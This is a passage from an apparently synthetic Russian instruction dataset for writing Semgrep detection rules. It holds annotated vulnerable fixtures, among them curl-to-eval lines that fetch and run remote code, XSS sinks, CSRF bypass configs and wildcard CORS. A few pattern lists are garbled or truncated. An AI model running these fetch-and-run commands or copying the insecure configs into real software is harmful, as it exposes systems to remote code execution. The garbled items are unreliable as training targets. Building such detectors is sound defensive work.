использования переменных-интерполяций (`${{...}}`) с данными контекста `github`, которые могут быть использованы в шаге `run`. Такие интерполяции представляют собой потенциальную угрозу инъекций команд оболочки, так как данные контекста `github` могут содержать произвольный ввод пользователя и должны рассматриваться как недоверенные. Правило ищет конкретные шаблоны, где такие интерполяции используются непосредственно в команде `run`, и рекомендует использовать промежуточную переменную окружения вместо прямого доступа к данным контекста.\n\n# Ключевые элементы:\n- ID: run-shell-injection\n- Язык: yaml \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "run-shell-injection",
      "language": "yaml",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения libxml-backend\nОписание уязвимости: This application is using LibXML as the XML backend. LibXML can be vulnerable to XML External Entities (XXE) vulnerabilities. Use the built-in Rails XML parser, REXML, instead.\nCWE: CWE-611: Improper Restriction of XML External Entity Reference\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-611: Improper Restriction of XML External Entity Reference\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: libxml-backend.rb\n# cf. https://www.stackhawk.com/blog/rails-xml-external-entities-xxe-guide-examples-and-prevention/\n\nrequire 'xml'\nrequire 'libxml'\n\n# ruleid: libxml-backend\nActiveSupport::XmlMini.backend = 'LibXML'\n\n# ok: libxml-backend\nActiveSupport::XmlMini.backend = 'REXML'\n\n# ok: libxml-backend\nActiveSupport::XmlMini.backend = 'Nokogiri'\n\n# Deny entity replacement in LibXML parsing\nLibXML::XML.class_eval do\n  def self.default_substitute_entities\n    XML.default_substitute_entities = false\n  end\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• ActiveSupport::XmlMini.backend = 'LibXML'\n• ActiveRecord::Base.send :include, ActiveSupport::XmlMini if ActiveSupport::XmlMini.backend == 'LibXML'\n\nБезопасные паттерны:  \n• ActiveSupport::XmlMini.backend = 'REXML'\n• ActiveSupport::XmlMini.backend = 'Nokogiri'\n\nЛегенда аннотаций:\n- // ruleid:libxml-backend: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:libxml-backend: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: libxml-backend\n  languages: [ruby]\n  pattern: ActiveSupport::XmlMini.backend = \"LibXML\"\n  severity: WARNING\n  message: >-\n    This application is using LibXML as the XML backend. LibXML can be vulnerable to\n    XML External Entities (XXE) vulnerabilities. Use the built-in Rails XML parser, REXML,\n    instead.\n  metadata:\n    references:\n    - https://www.stackhawk.com/blog/rails-xml-external-entities-xxe-guide-examples-and-prevention/\n    - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\n    technology:\n    - rails\n    - libxml\n    category: security\n    cwe:\n    - 'CWE-611: Improper Restriction of XML External Entity Reference'\n    owasp:\n    - A04:2017 - XML External Entities (XXE)\n    - A05:2021 - Security Misconfiguration\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования библиотеки LibXML в качестве бэкенда для обработки XML в Ruby-приложении. Паттерн ищет явное присвоение значения 'LibXML' переменной ActiveSupport::XmlMini.backend, что указывает на применение LibXML. Это может привести к уязвимостям XXE (XML External Entities), поэтому рекомендуется использовать встроенный парсер Rails — REXML вместо LibXML.\n\n# Ключевые элементы:\n- ID: libxml-backend\n- Язык: ruby \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "libxml-backend",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: detect-angular-trust-as-html-method\nОписание уязвимости: The use of $sce.trustAsHtml can be dangerous if unsanitized user input flows through this API.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: detect-angular-trust-as-html-method.js\nvar app = angular.module('MyApp', []);\napp.controller('myCtrl', function($scope, $sce) {\n\n$scope.userInput = 'foo';\n    $scope.sayHello = function() {\n     // ruleid:detect-angular-trust-as-html-method\n     $scope.trustedurl = $sce.trustAsHtml($scope.html);\n     // ruleid:detect-angular-trust-as-html-method\n     input = $scope.html\n     $scope.trustedurl = $sce.trustAsHtml(input);\n\n\n     //Data is not coming from user input\n     $scope.trustedurl = $sce.trustAsJs('stringLiteral');\n   };\n\n});  # Ограничиваем длину\n\nОпасные паттерны:\n• var app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) { $scope.userInput = 'foo'; $scope.sayHello = function() { $scope.trustedurl = $sce.trustAsHtml($scope.html); }; }\n• var app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) { $scope.userInput = 'foo'; $scope.sayHello = function() { var input = $scope.html; $scope.trustedurl = $sce.trust\n\nБезопасные паттерны:  \n• var app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) { $scope.userInput = 'foo'; $scope.sayHello = function() { $scope.trustedurl = $sce.trustAsJs('stringLiteral'); };\n• var app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) { $scope.userInput = 'foo'; $scope.sayHello = function() { $scope.trustedurl = $sce.trustAsHtml('trustedString'); \n\nЛегенда аннотаций:\n- // ruleid:detect-angular-trust-as-html-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-angular-trust-as-html-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-angular-trust-as-html-method\n  message: >-\n    The use of $sce.trustAsHtml can be dangerous if unsanitized user input flows through this API.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://docs.angularjs.org/api/ng/service/$sce#trustAsHtml\n    - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf\n    category: security\n    technology:\n    - angular\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-either:\n    - pattern: |\n        $SOURCE = $scope.$INPUT;\n        $sce.trustAsHtml($SOURCE);\n    - pattern: |\n        $sce.trustAsHtml($scope.$INPUT);\n  - pattern-inside: |\n      app.controller(..., function($scope,$sce){\n      ...\n      });\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода $sce.trustAsHtml в AngularJS, который может быть опасным, если входные данные пользователя не были должным образом очищены перед передачей через этот API. Анализ выполняется путем поиска шаблонов, где переменная, возможно содержащая пользовательский ввод ($SOURCE или $sce.trustAsHtml($SOURCE)), передается методу trustAsHtml. Шаблон также учитывает контекст контроллера AngularJS.\n\n# Ключевые элементы:\n- ID: detect-angular-trust-as-html-method\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "detect-angular-trust-as-html-method",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения conf-csrf-headers-bypass\nОписание уязвимости: Possibly bypassable CSRF configuration found. CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. Make sure that Content-Type black list is configured and CORS filter is turned on.\nCWE: CWE-352: Cross-Site Request Forgery (CSRF)\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-352: Cross-Site Request Forgery (CSRF)\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: conf-csrf-headers-bypass.conf\nplay.filters.csrf.header.bypassHeaders {\n  #ruleid: conf-csrf-headers-bypass\n  X-Requested-With = \"*\"\n  # ruleid: conf-csrf-headers-bypass\n  Csrf-Token = \"nocheck\"\n}\n\n\n# not enough blacklisted types\nplay.filters.csrf {\n  header {\n    bypassHeaders {\n      # ruleid: conf-csrf-headers-bypass\n      X-Requested-With = \"*\"\n      # ruleid: conf-csrf-headers-bypass\n      Csrf-Token = \"nocheck\"\n    }\n    protectHeaders = null\n  }\n  bypassCorsTrustedOrigins = false\n  method {\n    whiteList = []\n    blackList = [\"POST\"]\n  }\n  contentType.blackList = [\"text/plain\", \"multipart/form-data\", \"something/weird\"]\n}\n\n# safe configuration\nplay.filters.csrf {\n  header {\n    bypassHeaders {\n      #ok: conf-csrf-headers-bypass\n      X-Requested-With = \"*\"\n      #ok: conf-csrf-headers-bypass\n      Csrf-Token = \"nocheck\"\n    }\n    protectHeaders = null\n  }\n  bypassCorsTrustedOrigins = false\n  method {\n    whiteList = []\n    blackList = [\"POST\"]\n  }\n  contentType.blackList = [\"application/x-www-form-urlencoded\", \"multipart/form-data\", \"text/plain\"]\n}\n\n# safe configuration\nplay.filters.csrf {\n  header {\n    bypassHeaders {\n      #ok: conf-csrf-headers-bypass\n      X-Requested-With = \"*\"\n      #ok: conf-csrf-headers-bypass\n      Csrf-Token = \"nocheck\"\n    }\n    protectHeaders = null\n  }\n  bypassCorsTrustedOrigins = false\n  method {\n    whiteList = []\n    blackList = [\"POST\"]\n  }\n  contentType.blackList = [\n    \"application/x-www-form-urlencoded\",\n    \"multipart/form-data\",\n    \"text/plain\"\n  ]\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: conf-csrf-headers-bypass.conf\nplay.filters.csrf.header.bypassHeaders {\n  X-Requested-With = \"*\"\n  Csrf-Token = \"nocheck\"\n}\n• play.filters.csrf {\n  header {\n    bypassHeaders {\n      X-Requested-With = \"*\"\n      Csrf-Token = \"nocheck\"\n    }\n    protectHeaders = null\n  }\n• bypassCorsTrustedOrigins = false\n  method {\n    whiteList = []\n    blackList = [\n      \"POST\"\n    ]\n  }\n\nБезопасные паттерны:  \n• play.filters.csrf {\n  header {\n    bypassHeaders {\n      X-Requested-With = \"*\"\n      Csrf-Token = \"nocheck\"\n    }\n    protectHeaders = null\n  }\n• bypassCorsTrustedOrigins = false\n  method {\n    whiteList = []\n    blackList = [\n      \"POST\"\n    ]\n  }\n• contentType.blackList = [\n  \"application/x-www-form-urlencoded\",\n  \"multipart/form-data\",\n  \"text/plain\"\n]\n\nЛегенда аннотаций:\n- // ruleid:conf-csrf-headers-bypass: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:conf-csrf-headers-bypass: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: conf-csrf-headers-bypass\n  patterns:\n  - pattern-either:\n    - pattern: X-Requested-With = \"*\"\n    - pattern: Csrf-Token = \"...\"\n  - pattern-inside: |\n      bypassHeaders {...\n      ...\n      ...}\n  - pattern-not-inside: |\n      {...\n        ...\n        ...blackList = [...\"application/x-www-form-urlencoded\"...\"multipart/form-data\"...\"text/plain\"...]\n        ...\n      ...}\n  - pattern-not-inside: |\n      {...\n        ...\n        ...blackList = [...\"application/x-www-form-urlencoded\"...\"text/plain\"...\"multipart/form-data\"...]\n        ...\n      ...}\n  - pattern-not-inside: |\n      {...\n        ...\n        ...blackList = [...\"multipart/form-data\"...\"application/x-www-form-urlencoded\"...\"text/plain\"...]\n        ...\n      ...}\n  - pattern-not-inside: |\n      {...\n        ...\n        ...blackList = [...\"multipart/form-data\"...\"text/plain\"...\"application/x-www-form-urlencoded\"...]\n        ...\n      ...}\n  - pattern-not-inside: |\n      {...\n        ...\n        ...blackList = [...\"text/plain\"...\"application/x-www-form-urlencoded\"...\"multipart/form-data\"...]\n        ...\n      ...}\n  - pattern-not-inside: |\n      {...\n        ...\n        ...blackList = [...\"text/plain\"...\"multipart/form-data\"...\"application/x-www-form-urlencoded\"...]\n        ...\n      ...}\n  message: >-\n    Possibly bypassable CSRF configuration found.\n    CSRF is an attack that forces an end user to execute unwanted actions on a web application in which\n    they’re currently authenticated.\n    Make sure that Content-Type black list is configured and CORS filter is turned on.\n  languages: [generic]\n  severity: ERROR\n  paths:\n    include:\n    - '*.conf'\n  metadata:\n    references:\n    - https://www.playframework.com/documentation/2.8.x/Migration25#CSRF-changes\n    - https://owasp.org/www-community/attacks/csrf\n    cwe:\n    - 'CWE-352: Cross-Site Request Forgery (CSRF)'\n    owasp:\n    - A01:2021 - Broken Access Control\n    category: security\n    technology:\n    - scala\n    - play\n    confidence: MEDIUM\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций, которые могут позволить обход межсайтовых запросов с целью подделки (CSRF). Оно ищет конфигурации фильтров CSRF, где заголовки X-Requested-With или Csrf-Token не включены в черный список допустимых типов контента (content-type blacklist) или отсутствуют механизмы защиты от межсайтового запроса (CORS). Правило использует комбинацию шаблонов pattern-either, pattern-inside и pattern-not-inside для проверки наличия опасных заголовков и отсутствия черного списка допустимых типов контента.\n\n# Ключевые элементы:\n- ID: conf-csrf-headers-bypass\n- Язык: generic \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "conf-csrf-headers-bypass",
      "language": "generic",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: aws-qldb-inadequate-ledger-permissions-mode\nОписание уязвимости: The AWS QLDB ledger permissions are too permissive. Consider using \"'STANDARD'\" permissions mode if possible.\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-qldb-inadequate-ledger-permissions-mode.tf\n# pass\n\nresource \"aws_qldb_ledger\" \"standard\" {\n  name             = \"ledger\"\n  permissions_mode = \"STANDARD\"\n}\n\n# failure\n# ruleid: aws-qldb-inadequate-ledger-permissions-mode\nresource \"aws_qldb_ledger\" \"allow_all\" {\n  name             = \"ledger\"\n  permissions_mode = \"ALLOW_ALL\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_qldb_ledger\" \"allow_all\" { \n  name = \"ledger\"\n  permissions_mode = \"ALLOW_ALL\"\n}\n• resource \"aws_qldb_ledger\" \"another_allow_all\" { \n  name = \"another_ledger\"\n  permissions_mode = \"ALLOW_ALL\"\n}\n\nБезопасные паттерны:  \n• resource \"aws_qldb_ledger\" \"standard\" { \n  name = \"ledger\"\n  permissions_mode = \"STANDARD\"\n}\n• resource \"aws_qldb_ledger\" \"restricted\" { \n  name = \"restricted_ledger\"\n  permissions_mode = \"RESTRICTED\"\n}\n\nЛегенда аннотаций:\n- // ruleid:aws-qldb-inadequate-ledger-permissions-mode: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-qldb-inadequate-ledger-permissions-mode: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-qldb-inadequate-ledger-permissions-mode\n  patterns:\n    - pattern: |\n        resource \"aws_qldb_ledger\" $ANYTHING {\n          ...\n          permissions_mode = \"ALLOW_ALL\"\n          ...\n        }\n  message: >-\n    The AWS QLDB ledger permissions are too permissive. Consider using \"'STANDARD'\" permissions mode if possible.\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    category: best-practice\n    technology:\n    - terraform\n    - aws\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS QLDB ledgers с установленным параметром 'permissions_mode' равным 'ALLOW_ALL'. Правило использует шаблон, который ищет ресурс 'aws_qldb_ledger' с любым именем и любым набором атрибутов, но обязательно содержащий параметр 'permissions_mode', имеющий значение 'ALLOW_ALL'. Это считается небезопасной практикой, так как режим 'ALLOW_ALL' предоставляет слишком широкие права доступа.\n\n# Ключевые элементы:\n- ID: aws-qldb-inadequate-ledger-permissions-mode\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-qldb-inadequate-ledger-permissions-mode",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения intercom-settings-user-identifier-without-user-hash\nОписание уязвимости: Found an initialization of the Intercom Messenger that identifies a User, but does not specify a `user_hash`. This configuration allows users to impersonate one another. See the Intercom Identity Verification docs for more context https://www.intercom.com/help/en/articles/183-set-up-identity-verification-for-web-and-mobile\nCWE: CWE-287: Improper Authentication\nТип анализа: search\nЯзык: js",
    "input": "Требования:\n- Язык: js\n- Тип анализа: search\n- CWE: CWE-287: Improper Authentication\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: intercom-settings-user-identifier-without-user-hash.js\n// ok: intercom-settings-user-identifier-without-user-hash\nwindow.intercomSettings = {\n  app_id: appId,\n  name: myUserName,\n  email: myUserEmail,\n  user_hash: \"my-user-hash\",\n};\n\n// ok: intercom-settings-user-identifier-without-user-hash\nwindow.intercomSettings = {\n  app_id: appId,\n  name: myUserName,\n  user_id: myUserID,\n  user_hash: \"my-user-hash\",\n};\n\n// ruleid: intercom-settings-user-identifier-without-user-hash\nwindow.intercomSettings = {\n  app_id: appId,\n  name: myUserName,\n  email: myUserEmail,\n};\n\n// ruleid: intercom-settings-user-identifier-without-user-hash\nwindow.intercomSettings = {\n  app_id: appId,\n  name: myUserName,\n  user_id: myUserID,\n};\n\n// ruleid: intercom-settings-user-identifier-without-user-hash\nIntercom('boot', {\n    app_id: 'abc12345',\n    email: 'john.doe@example.com',\n    name: 'John Doe',\n    user_id: '9876'\n});\n\n// ok: intercom-settings-user-identifier-without-user-hash\nIntercom('boot', {\n    app_id: 'abc12345',\n    email: 'john.doe@example.com',\n    name: 'John Doe',\n    user_id: '9876',\n    user_hash: 'my-user-hash'\n});\n\n// ruleid: intercom-settings-user-identifier-without-user-hash\nIntercom('boot', {\n    app_id: 'abc12345',\n    email: 'john.doe@example.com',\n    name: 'John Doe',\n});\n\n// ok: intercom-settings-user-identifier-without-user-hash\nIntercom('boot', {\n    app_id: 'abc12345',\n    email: 'john.doe@example.com',\n    name: 'John Doe',\n    user_hash: 'my-user-hash'\n});\n\n// ruleid: intercom-settings-user-identifier-without-user-hash\nIntercom('boot', {\n    app_id: 'abc12345',\n    name: 'John Doe',\n    user_id: '9876'\n});\n\n// ok: intercom-settings-user-identifier-without-user-hash\nIntercom('boot', {\n    app_id: 'abc12345',\n    name: 'John Doe',\n    user_id: '9876',\n    user_hash: 'my-user-hash'\n});\n\n// ruleid: intercom-settings-user-identifier-without-user-hash\nmyCustomSettings = {\n  app_id: appId,\n  name: myUserName,\n  user_id: myUserID,\n};\n\nIntercom('boot', myCustomSet  # Ограничиваем длину\n\nОпасные паттерны:\n• window.intercomSettings = {..., email: myUserEmail, ...};\n• Intercom('boot', {..., email: 'john.doe@example.com', ...});\n• $VAR = {..., email: myUserEmail, ...};\n...\nIntercom('boot', $VAR);\n\nБезопасные паттерны:  \n• window.intercomSettings = {..., user_hash: \"my-user-hash\", ...};\n• Intercom('boot', {..., user_hash: 'my-user-hash', ...});\n• $VAR = {..., user_hash: 'my-user-hash', ...};\n...\nIntercom('boot', $VAR);\n\nЛегенда аннотаций:\n- // ruleid:intercom-settings-user-identifier-without-user-hash: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:intercom-settings-user-identifier-without-user-hash: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: intercom-settings-user-identifier-without-user-hash\n    patterns:\n      - pattern-either:\n          - pattern: |\n              window.intercomSettings = {..., email: $EMAIL, ...};\n          - pattern: |\n              window.intercomSettings = {..., user_id: $USER_ID, ...};\n          - pattern: |\n              Intercom('boot', {..., email: $EMAIL, ...});\n          - pattern: |\n              Intercom('boot', {..., user_id: $USER_ID, ...});\n          - pattern: |\n              $VAR = {..., email: $EMAIL, ...};\n              ...\n              Intercom('boot', $VAR);\n          - pattern: |\n              $VAR = {..., user_id: $EMAIL, ...};\n              ...\n              Intercom('boot', $VAR);\n      - pattern-not: |\n          window.intercomSettings = {..., user_hash: $USER_HASH, ...};\n      - pattern-not: |\n          Intercom('boot', {..., user_hash: $USER_HASH, ...});\n      - pattern-not: |\n          $VAR = {..., user_hash: $USER_HASH, ...};\n          ...\n          Intercom('boot', $VAR);\n    message: Found an initialization of the Intercom Messenger that identifies a\n      User, but does not specify a `user_hash`. This configuration allows users\n      to impersonate one another. See the Intercom Identity Verification docs\n      for more context\n      https://www.intercom.com/help/en/articles/183-set-up-identity-verification-for-web-and-mobile\n    languages:\n      - js\n    severity: WARNING\n    metadata:\n      category: security\n      subcategory:\n        - audit\n      cwe:\n        - \"CWE-287: Improper Authentication\"\n      confidence: MEDIUM\n      likelihood: MEDIUM\n      impact: HIGH\n      technology:\n        - intercom\n      references:\n        - https://www.intercom.com/help/en/articles/183-set-up-identity-verification-for-web-and-mobile\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска инициализаций объекта intercomSettings или вызова функции Intercom('boot') без указания поля user_hash. Паттерны используют оператор pattern-either для проверки наличия полей email или user_id в объекте intercomSettings или аргументах функции Intercom. Дополнительно применяются отрицательные паттерны для исключения случаев, когда поле user_hash присутствует в объекте или вызове функции.\n\n# Ключевые элементы:\n- ID: intercom-settings-user-identifier-without-user-hash\n- Язык: js \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "intercom-settings-user-identifier-without-user-hash",
      "language": "js",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения curl-eval\nОписание уязвимости: Data is being eval'd from a `curl` command. An attacker with control of the server in the `curl` command could inject malicious code into the `eval`, resulting in a system comrpomise. Avoid eval'ing untrusted data if you can. If you must do this, consider checking the SHA sum of the content returned by the server to verify its integrity.\nCWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\nТип анализа: taint\nЯзык: bash\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: bash\n- Тип анализа: taint\n- CWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: curl-eval.bash\n#!/bin/bash\n\nx=$(curl -L https://raw.githubusercontent.com/something)\n# ruleid: curl-eval\neval ${x}\n\nyy=`curl $SOME_URL`\neval yy\n# ruleid: curl-eval\neval ${yy}\n\nscrpt=$(curl -L https://raw.githubusercontent.com/something)\necho scrpt\nscrpt2=$( ${scrpt} | tr -d 1 )\n# ruleid: curl-eval\neval ${scrpt2}\n\n# ruleid: curl-eval\neval $(curl -L https://raw.githubusercontent.com/something)\n\n# ok: curl-eval\neval \"x=1\"  # Ограничиваем длину\n\nОпасные паттерны:\n• # ruleid: curl-eval\neval $(curl -L https://raw.githubusercontent.com/something)\n• # ruleid: curl-eval\neval ${x}\nyy=`curl $SOME_URL\neval yy\n• # ruleid: curl-eval\neval ${scrpt2}\n\nБезопасные паттерны:  \n• # ok: curl-eval\neval \"x=1\"\n• data=$(curl -L https://example.com/data.txt)\necho $data\n• content=$(curl -L https://example.com/content.html)\necho $content\n\nЛегенда аннотаций:\n- // ruleid:curl-eval: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:curl-eval: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: curl-eval\n  severity: WARNING\n  languages:\n  - bash\n  message: Data is being eval'd from a `curl` command. An attacker with control of the server in the `curl`\n    command could inject malicious code into the `eval`, resulting in a system comrpomise. Avoid eval'ing\n    untrusted data if you can. If you must do this, consider checking the SHA sum of the content returned\n    by the server to verify its integrity.\n  metadata:\n    owasp:\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\"\n    category: security\n    technology:\n    - bash\n    - curl\n    confidence: MEDIUM\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n  mode: taint\n  pattern-sources:\n  - pattern: |\n      $(curl ...)\n  - pattern: |\n      `curl ...`\n  pattern-sinks:\n  - pattern: eval ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования команды 'eval' вместе с результатом выполнения 'curl'. Источники потенциально небезопасных данных определяются шаблонами, содержащими вызов 'curl' с последующей передачей результата непосредственно в 'eval'. Безопасный код не использует 'eval' для обработки данных, полученных от 'curl', или применяет дополнительные меры проверки целостности данных перед их исполнением.\n\n# Ключевые элементы:\n- ID: curl-eval\n- Язык: bash \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "curl-eval",
      "language": "bash",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: azure-appservice-disallowed-cors\nОписание уязвимости: Ensure that CORS disallows every resource to access app services\nCWE: CWE-942: Permissive Cross-domain Policy with Untrusted Domains\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-appservice-disallowed-cors.tf\n# fail\nresource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n\n    site_config {\n    dotnet_framework_version = \"v4.0\"\n    scm_type                 = \"LocalGit\"\n    cors {\n        # ruleid: azure-appservice-disallowed-cors\n        allowed_origins = [\"*\"]\n    }\n    }\n\n    app_settings = {\n    \"SOME_KEY\" = \"some-value\"\n    }\n\n    connection_string {\n    name  = \"Database\"\n    type  = \"SQLServer\"\n    value = \"Server=some-server.mydomain.com;Integrated Security=SSPI\"\n    }\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n\n    site_config {\n    dotnet_framework_version = \"v4.0\"\n    scm_type                 = \"LocalGit\"\n    cors {\n        allowed_origins = [\"192.0.0.1\"]\n    }\n    }\n\n    app_settings = {\n    \"SOME_KEY\" = \"some-value\"\n    }\n\n    connection_string {\n    name  = \"Database\"\n    type  = \"SQLServer\"\n    value = \"Server=some-server.mydomain.com;Integrated Security=SSPI\"\n    }\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n\n    site_config {\n    dotnet_framework_version = \"v4.0\"\n    scm_type                 = \"LocalGit\"\n    }\n\n    app_settings = {\n    \"SOME_KEY\" = \"some-value\"\n    }\n\n    connection_string {\n    name  = \"Database\"\n    type  = \"SQLServer\"\n    value = \"Server=some-server.mydomain.com;Integrated Security=SSPI  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \\\n•  \\\n•  { ... cors { allowed_origins = [\\\n\nБезопасные паттерны:  \n• resource \\\n•  \\\n•  { ... cors { allowed_origins = [\\\n\nЛегенда аннотаций:\n- // ruleid:azure-appservice-disallowed-cors: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-appservice-disallowed-cors: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-appservice-disallowed-cors\n  patterns:\n  - pattern: |\n      [\"*\"]\n  - pattern-inside: allowed_origins = ...\n  - pattern-inside: |\n      $RESOURCE \"azurerm_app_service\" \"...\" {\n      ...\n      }\n  message: Ensure that CORS disallows every resource to access app services\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    cwe:\n    - 'CWE-942: Permissive Cross-domain Policy with Untrusted Domains'\n    category: security\n    technology:\n    - terraform\n    - azure\n\n    references:\n    - https://owasp.org/Top10/A05_2021-Security_Misconfiguration\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure App Service, где политика CORS разрешает доступ ко всем ресурсам (*), что является потенциальной угрозой безопасности. Анализ выполняется путем поиска блока конфигурации 'cors' внутри ресурса 'azurerm_app_service', который содержит параметр 'allowed_origins'. Если значение этого параметра равно '*', то правило отмечает этот код как потенциально небезопасный. Безопасным считается случай, когда явно указаны конкретные IP-адреса или домены вместо '*'.\n\n# Ключевые элементы:\n- ID: azure-appservice-disallowed-cors\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-appservice-disallowed-cors",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
